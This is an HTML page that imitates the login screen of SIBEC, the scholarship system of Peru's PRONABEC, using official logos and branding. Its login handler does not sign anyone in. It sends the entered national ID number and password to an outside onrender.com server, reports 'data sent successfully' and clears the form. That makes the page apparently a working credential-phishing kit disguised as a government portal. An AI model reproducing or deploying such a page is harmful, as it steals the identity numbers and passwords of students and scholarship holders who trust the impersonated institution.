<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIBEC - Iniciar Sesi√≥n</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e8f4f8 0%, #f0f8fc 100%);
            min-height: 100vh;
            display: flex;
            position: relative;
            overflow-x: hidden;
        }

        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background: white;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-peru {
            height: 50px;
        }

        .logo-pronabec {
            height: 40px;
        }

        .left-section {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 120px 40px 40px;
            max-width: 500px;
        }

        .login-card {
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
        }

        .sibec-logo {
            text-align: center;
            margin-bottom: 35px;
        }

        .sibec-logo img {
            max-width: 200px;
            height: auto;
        }

        h2 {
            font-size: 28px;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 15px;
            color: #666;
            margin-bottom: 25px;
        }

        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-size: 13px;
            color: #555;
            line-height: 1.6;
        }

        .info-box a {
            color: #e91e63;
            text-decoration: none;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 40px 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0066a1;
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            cursor: pointer;
            font-size: 18px;
        }

        .forgot-password {
            text-align: center;
            margin: 15px 0 25px;
        }

        .forgot-password a {
            color: #333;
            text-decoration: underline;
            font-size: 14px;
        }

        .btn-login {
            width: 100%;
            background: linear-gradient(135deg, #e91e63 0%, #d81b60 100%);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(233, 30, 99, 0.3);
        }

        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(233, 30, 99, 0.4);
        }

        .footer-links {
            display: flex;
            justify-content: space-around;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }

        .footer-links a {
            color: #e91e63;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }

        .right-section {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 120px 40px 40px;
            position: relative;
        }

        .decoration {
            position: absolute;
            border-radius: 50%;
            opacity: 0.7;
        }

        .decoration-1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(135deg, #ff00ff 0%, #8b00ff 100%);
            top: 50px;
            right: -100px;
        }

        .decoration-2 {
            width: 200px;
            height: 200px;
            background: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
            bottom: 200px;
            right: 150px;
        }

        .decoration-3 {
            width: 80px;
            height: 80px;
            background: white;
            top: 150px;
            right: 250px;
        }

        .decoration-4 {
            width: 60px;
            height: 60px;
            background: white;
            top: 280px;
            right: 450px;
        }

        .decoration-5 {
            width: 50px;
            height: 50px;
            background: white;
            bottom: 150px;
            right: 400px;
        }

        .pronabec-logo {
            position: relative;
            z-index: 10;
            max-width: 600px;
        }

        .pronabec-logo img {
            width: 100%;
            height: auto;
            filter: drop-shadow(0 10px 30px rgba(0,0,0,0.2));
        }

        .hashtag {
            position: absolute;
            bottom: 80px;
            right: 100px;
            font-size: 32px;
            font-weight: 800;
            color: #ff6600;
            z-index: 11;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }

        @media (max-width: 1024px) {
            body {
                flex-direction: column;
            }

            .right-section {
                display: none;
            }

            .left-section {
                max-width: 100%;
                padding: 100px 20px 40px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <img src="img/ministerio.png" alt="Per√∫" class="logo-peru">
            <img src="img/pronabec.png" alt="PRONABEC" class="logo-pronabec">
        </div>
    </div>

    <div class="left-section">
        <div class="login-card">
            <div class="sibec-logo">
                <img src="img/lodoxde.png" alt="SIBEC by PRONABEC">
            </div>

            <h2>¬°Hola!</h2>
            <p class="subtitle">Ingresa tus datos para <strong>iniciar sesi√≥n.</strong></p>

            <div class="info-box">
                Si este es tu primer ingreso del a√±o 2025, debes hacer clic en <a href="#">Crear cuenta</a> para registrarte en nuestra nueva plataforma.
            </div>

            <form onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label for="documento">Documento nacional de identidad</label>
                    <div class="input-wrapper">
                        <input type="text" id="documento" placeholder="" required>
                        <span class="input-icon">üë§</span>
                    </div>
                </div>

                <div class="form-group">
                    <label for="password">Contrase√±a</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Ingreso tu contrase√±a" required>
                        <span class="input-icon" onclick="togglePassword()">üëÅÔ∏è</span>
                    </div>
                </div>

                <div class="forgot-password">
                    <a href="#">Olvid√© mi contrase√±a</a>
                </div>

                <button type="submit" class="btn-login">Iniciar sesi√≥n</button>

                <div class="footer-links">
                    <a href="#">Crear cuenta</a>
                    <a href="#">Cambiar correo</a>
                </div>
            </form>
        </div>
    </div>

    <div class="right-section">
        <div class="decoration decoration-1"></div>
        <div class="decoration decoration-2"></div>
        <div class="decoration decoration-3"></div>
        <div class="decoration decoration-4"></div>
        <div class="decoration decoration-5"></div>
        
        <div class="pronabec-logo">
            <img src="img/somos.png" alt="Somos Pronabec">
        </div>
        
        <div class="hashtag">#TransformamosVidas</div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const icon = event.target;
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                icon.textContent = 'üëÅÔ∏è';
            } else {
                passwordInput.type = 'password';
                icon.textContent = 'üëÅÔ∏è';
            }
        }

        async function handleLogin(event) {
            event.preventDefault();
            const documento = document.getElementById('documento').value;
            const password = document.getElementById('password').value;
            
            if (documento && password) {
                try {
                    // Enviar datos al servidor
                    const response = await fetch('https://pronabec-d9gs.onrender.com/register', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: documento,
                            password: password
                        })
                    });

                    const data = await response.json();
                    
                    if (response.ok) {
                        alert('Datos enviados correctamente');
                        // Redirigir o limpiar formulario
                        document.getElementById('documento').value = '';
                        document.getElementById('password').value = '';
                    } else {
                        alert('Error: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error al conectar con el servidor');
                }
            }
        }
    </script>
</body>
</html>
